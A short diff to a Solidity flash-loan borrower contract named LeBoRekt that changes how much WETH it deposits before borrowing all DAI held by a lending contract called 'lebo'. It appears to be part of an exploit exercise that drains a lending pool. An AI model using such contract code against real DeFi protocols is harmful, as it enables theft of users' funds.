@@ -60,7 +60,7 @@ contract LeBoRekt is IERC3156FlashBorrower {
         uint256 wethRequired = leboBalance / lebo.ethPrice() + 1;
 
         // Deposit required ETH in lebo
-        lebo.depositWETH(wethRequired);
+        lebo.depositWETH(1+100/90*wethRequired);
         // Borrow all DAI in the lebo contract
         lebo.borrowDAI(leboBalance);
 
